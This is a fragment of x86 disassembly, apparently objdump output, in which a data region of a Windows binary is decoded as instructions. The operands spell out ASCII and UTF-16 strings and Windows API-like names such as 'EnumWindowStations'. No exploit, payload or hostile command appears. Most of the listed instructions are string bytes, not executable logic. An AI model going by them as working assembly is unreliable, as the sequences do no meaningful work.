  42389f:	push   esp
  4238a0:	cmp    BYTE PTR [eax],al
  4238a2:	dec    esp
  4238a3:	xor    al,0x44
  4238a5:	xor    DWORD PTR [edi+0x4b],ebx
  4238a8:	xor    DWORD PTR [ebp+0x5f],eax
  4238ab:	pop    edx
  4238ac:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238b0:	pop    edi
  4238b1:	inc    edx
  4238b2:	xor    dh,BYTE PTR [ecx]
  4238b4:	push   ebx
  4238b5:	xor    DWORD PTR [ecx],edi
  4238b7:	inc    edx
  4238b8:	add    BYTE PTR [edi+0x45],al
  4238bb:	xor    al,0x38
  4238bd:	xor    BYTE PTR [eax],dh
  4238bf:	pop    edi
  4238c0:	dec    edx
  4238c1:	dec    ebx
  4238c2:	xor    eax,0x33345f4d
  4238c7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238cb:	pop    edi
  4238cc:	aaa    
  4238cd:	push   esi
  4238ce:	dec    ebx
  4238cf:	push   edx
  4238d0:	pop    edi
  4238d1:	inc    ebx
  4238d2:	add    BYTE PTR [edx+0x35],bl
  4238d5:	dec    ebp
  4238d6:	pop    edi
  4238d7:	inc    edi
  4238d8:	dec    esi
  4238d9:	xor    al,0x49
  4238db:	xor    eax,0x54590035
  4238e0:	push   edx
  4238e1:	pop    edi
  4238e2:	push   esp
  4238e3:	inc    ebx
  4238e4:	inc    ecx
  4238e5:	pop    edi
  4238e6:	cmp    DWORD PTR [ecx+0x41],ebx
  4238e9:	push   ebp
  4238ea:	pop    edi
  4238eb:	push   ebp
  4238ec:	inc    ebp
  4238ed:	add    BYTE PTR [esi+esi*1+0x35],cl
  4238f1:	pop    edi
  4238f2:	pop    eax
  4238f3:	dec    edx
  4238f4:	inc    edx
  4238f5:	inc    edi
  4238f6:	add    BYTE PTR [edx+0x36],al
  4238f9:	inc    ebx
  4238fa:	pop    edi
  4238fb:	xor    BYTE PTR ds:0x36464b,dh
  423901:	dec    ebx
  423902:	cmp    DWORD PTR [esi+0x37],eax
  423905:	xor    ebx,DWORD PTR [edi+0x35]
  423908:	ss inc edi
  42390a:	pop    ecx
  42390b:	dec    eax
  42390c:	pop    ecx
  42390d:	add    BYTE PTR [ebp+0x35],cl
  423910:	push   eax
  423911:	xor    BYTE PTR [edi+0x4f],bl
  423914:	pop    ecx
  423915:	xor    cl,BYTE PTR [edi+0x0]
  423918:	pop    ecx
  423919:	xor    DWORD PTR [esi+0x5f],ecx
  42391c:	xor    al,BYTE PTR [edx+0x30]
  42391f:	push   esi
  423920:	push   esp
  423921:	inc    ebp
  423922:	add    BYTE PTR [edi+0x37],al
  423925:	push   esi
  423926:	xor    DWORD PTR [edi+0x49],ebx
  423929:	xor    al,BYTE PTR [esi+0x30]
  42392c:	pop    edi
  42392d:	ss dec esi
  42392f:	cmp    BYTE PTR [eax],al
  423931:	pop    edx
  423932:	xor    eax,0x445f334b
  423937:	xor    BYTE PTR [eax],bh
  423939:	push   ecx
  42393a:	push   esi
  42393b:	xor    al,0x0
  42393d:	push   ebp
  42393e:	pop    eax
  42393f:	inc    edi
  423940:	xor    DWORD PTR [edi+0x39],ebx
  423943:	push   esp
  423944:	inc    ebx
  423945:	aaa    
  423946:	inc    esp
  423947:	add    BYTE PTR [edi+0x39],dl
  42394a:	ss pop edi
  42394c:	dec    eax
  42394d:	pop    edx
  42394e:	pop    ecx
  42394f:	inc    edi
  423950:	push   ebp
  423951:	pop    edi
  423952:	push   eax
  423953:	dec    eax
  423954:	inc    ebx
  423955:	add    BYTE PTR [ebp+0x0],dl
  423958:	xor    al,0x0
  42395a:	dec    edi
  42395b:	add    BYTE PTR [edi+0x0],bl
  42395e:	cmp    BYTE PTR [eax],al
  423960:	xor    al,BYTE PTR [eax]
  423962:	inc    ebx
  423963:	add    BYTE PTR [edx+0x0],bl
  423966:	inc    ebx
  423967:	add    BYTE PTR [edi],dh
  423969:	add    BYTE PTR [edi+0x0],bl
  42396c:	inc    ebx
  42396d:	add    BYTE PTR [eax+eax*1+0x0],al
  423971:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423975:	add    BYTE PTR [edx],dh
  423977:	add    BYTE PTR [edi+0x0],bl
  42397a:	cmp    BYTE PTR [eax],al
  42397c:	dec    esp
  42397d:	add    BYTE PTR [esi+0x0],dl
  423980:	pop    edi
  423981:	add    BYTE PTR [ecx+0x0],bl
  423984:	push   edx
  423985:	add    BYTE PTR [esi+0x0],dl
  423988:	xor    al,BYTE PTR [eax]
  42398a:	cmp    BYTE PTR [eax],al
  42398c:	pop    edi
  42398d:	add    BYTE PTR [edx+0x0],cl
  423990:	add    BYTE PTR [eax],al
  423992:	inc    edx
  423993:	add    BYTE PTR [eax+eax*1+0x46],cl
  423997:	add    BYTE PTR [edi+0x0],bl
  42399a:	xor    eax,DWORD PTR [eax]
  42399c:	inc    ebp
  42399d:	add    BYTE PTR [ecx+0x0],cl
  4239a0:	push   edx
  4239a1:	add    BYTE PTR [ecx],bh
  4239a3:	add    BYTE PTR [esi+0x0],dl
  4239a6:	add    BYTE PTR [eax],al
  4239a8:	dec    ebp
  4239a9:	add    BYTE PTR [edi],dh
  4239ab:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239af:	add    BYTE PTR [edx+0x0],cl
  4239b2:	pop    eax
  4239b3:	add    BYTE PTR [ebx],dh
  4239b5:	add    BYTE PTR [ecx],dh
  4239b7:	add    BYTE PTR [ebx+0x0],al
  4239ba:	add    BYTE PTR [eax],al
  4239bc:	dec    edi
  4239bd:	add    BYTE PTR [esi],dh
  4239bf:	add    BYTE PTR [eax+0x0],cl
  4239c2:	pop    edi
  4239c3:	add    BYTE PTR [eax],dh
  4239c5:	add    BYTE PTR [edi],dh
  4239c7:	add    BYTE PTR [ecx],dh
  4239c9:	add    BYTE PTR [edx+0x0],dl
  4239cc:	xor    eax,0x55000000
  4239d1:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4239d5:	add    BYTE PTR [edi+0x0],bl
  4239d8:	push   esp
  4239d9:	add    BYTE PTR [ecx+0x0],al
  4239dc:	cmp    DWORD PTR [eax],eax
  4239de:	pop    edi
  4239df:	add    BYTE PTR [ebx],dh
  4239e1:	add    BYTE PTR [eax],dh
  4239e3:	add    BYTE PTR [eax],bh
  4239e5:	add    BYTE PTR [edi+0x0],cl
  4239e8:	inc    ebx
  4239e9:	add    BYTE PTR ds:0x4d000000,dh
  4239ef:	add    BYTE PTR [esi+0x0],cl
  4239f2:	inc    ebp
  4239f3:	add    BYTE PTR [edi+0x0],bl
  4239f6:	push   esp
  4239f7:	add    BYTE PTR [esi+0x0],al
  4239fa:	cmp    BYTE PTR [eax],al
  4239fc:	push   ebx
  4239fd:	add    BYTE PTR [edx+0x0],bl
  423a00:	pop    edi
  423a01:	add    BYTE PTR [eax],dh
  423a03:	add    BYTE PTR [eax],bh
  423a05:	add    BYTE PTR [eax+0x0],cl
  423a08:	add    BYTE PTR [eax],al
  423a0a:	dec    esi
  423a0b:	add    BYTE PTR [edi+0x0],cl
  423a0e:	pop    edx
  423a0f:	add    BYTE PTR [edi+0x0],bl
  423a12:	add    BYTE PTR ss:[ecx+0x0],bl
  423a16:	dec    ebp
  423a17:	add    BYTE PTR [esi],dh
  423a19:	add    BYTE PTR [ebx],dh
  423a1b:	add    BYTE PTR [edi+0x0],bl
  423a1e:	xor    al,0x0
  423a20:	dec    esi
  423a21:	add    BYTE PTR [edx],dh
  423a23:	add    BYTE PTR [esi],dh
  423a25:	add    BYTE PTR [ecx],dh
  423a27:	add    BYTE PTR [eax],al
  423a29:	add    BYTE PTR [ebx+0x0],cl
  423a2c:	dec    eax
  423a2d:	add    BYTE PTR [eax],bh
  423a2f:	add    BYTE PTR [edi+0x0],bl
  423a32:	inc    esi
  423a33:	add    BYTE PTR [esi+0x0],al
  423a36:	push   esp
  423a37:	add    BYTE PTR [edi],dh
  423a39:	add    BYTE PTR [esi],dh
  423a3b:	add    BYTE PTR [edi+0x0],bl
  423a3e:	dec    esp
  423a3f:	add    BYTE PTR [ecx+0x0],bl
  423a42:	add    BYTE PTR [eax],al
  423a44:	push   ebx
  423a45:	add    BYTE PTR [ecx+0x0],bl
  423a48:	xor    BYTE PTR [eax],al
  423a4a:	pop    edi
  423a4b:	add    BYTE PTR [ecx],bh
  423a4d:	add    BYTE PTR [edx+0x0],dl
  423a50:	dec    eax
  423a51:	add    BYTE PTR [ecx+0x0],bl
  423a54:	xor    al,BYTE PTR [eax]
  423a56:	pop    edi
  423a57:	add    BYTE PTR [eax],dh
  423a59:	add    BYTE PTR [eax],al
  423a5b:	add    BYTE PTR [edx+0x0],al
  423a5e:	dec    edx
  423a5f:	add    BYTE PTR [esi+0x0],cl
  423a62:	xor    al,BYTE PTR [eax]
  423a64:	pop    edi
  423a65:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a69:	add    BYTE PTR [edx+0x0],dl
  423a6c:	xor    al,0x0
  423a6e:	dec    eax
  423a6f:	add    BYTE PTR [eax],al
  423a71:	add    BYTE PTR [ebp+0x0],dl
  423a74:	add    BYTE PTR ss:[ebp+0x0],cl
  423a78:	xor    DWORD PTR [eax],eax
  423a7a:	pop    edi
  423a7b:	add    BYTE PTR [esi],dh
  423a7d:	add    BYTE PTR [ecx+0x0],bl
  423a80:	push   ebp
  423a81:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423a85:	add    BYTE PTR [edi+0x0],cl
  423a88:	inc    esp
  423a89:	add    BYTE PTR [edi+0x0],dl
  423a8c:	push   ebx
  423a8d:	add    BYTE PTR [eax],al
  423a8f:	add    BYTE PTR [edx+0x0],bl
  423a92:	inc    ebx
  423a93:	add    BYTE PTR [ebp+0x0],dl
  423a96:	pop    edi
  423a97:	add    BYTE PTR [ecx],dh
  423a99:	add    BYTE PTR [ebp+0x0],al
  423a9c:	push   esp
  423a9d:	add    BYTE PTR [eax],dh
  423a9f:	add    BYTE PTR [eax],al
  423aa1:	add    BYTE PTR [eax],al
  423aa3:	add    BYTE PTR [eax],al
  423aa5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423aab:	inc    edx
  423aac:	add    BYTE PTR [eax],cl
  423aae:	add    BYTE PTR [edx+0x0],0xc
  423ab2:	add    BYTE PTR [edx+0x0],0x10
  423ab6:	add    BYTE PTR [edx+0x0],0x14
  423aba:	add    BYTE PTR [edx+0x0],0x18
  423abe:	add    BYTE PTR [edx+0x0],0x1c
  423ac2:	add    BYTE PTR [edx+0x0],0x20
  423ac6:	add    BYTE PTR [edx+0x0],0x24
  423aca:	add    BYTE PTR [edx+0x0],0x28
  423ace:	add    BYTE PTR [edx+0x0],0x0
	...
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	sbb    edi,DWORD PTR [edi+0x4d57]
  423aea:	add    BYTE PTR [eax],al
  423aec:	adc    bh,BYTE PTR [ebx]
  423aee:	add    al,BYTE PTR [eax]
  423af0:	add    DWORD PTR [eax],eax
  423af2:	add    BYTE PTR [eax],al
  423af4:	add    DWORD PTR [eax],eax
  423af6:	add    BYTE PTR [eax],al
  423af8:	add    DWORD PTR [eax],eax
  423afa:	add    BYTE PTR [eax],al
  423afc:	or     BYTE PTR [ebx],bh
  423afe:	add    al,BYTE PTR [eax]
  423b00:	or     al,0x3b
  423b02:	add    al,BYTE PTR [eax]
  423b04:	adc    BYTE PTR [ebx],bh
  423b06:	add    al,BYTE PTR [eax]
  423b08:	inc    esi
  423b09:	iret   
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	push   ds
  423b0d:	cmp    eax,DWORD PTR [edx]
  423b0f:	add    BYTE PTR [eax],al
  423b11:	add    BYTE PTR [edi+0x6f],dl
  423b14:	jb     0x423b7a
  423b16:	push   edi
  423b17:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b1e:	aas    
  423b1f:	inc    ebp
  423b20:	outs   dx,BYTE PTR ds:[esi]
  423b21:	jne    0x423b90
  423b23:	push   edi
  423b24:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b2b:	popa   
  423b2c:	je     0x423b97
  423b2e:	outs   dx,DWORD PTR ds:[esi]
  423b2f:	outs   dx,BYTE PTR ds:[esi]
  423b30:	jae    0x423b85
  423b32:	je     0x423b95
  423b34:	.byte 0x74
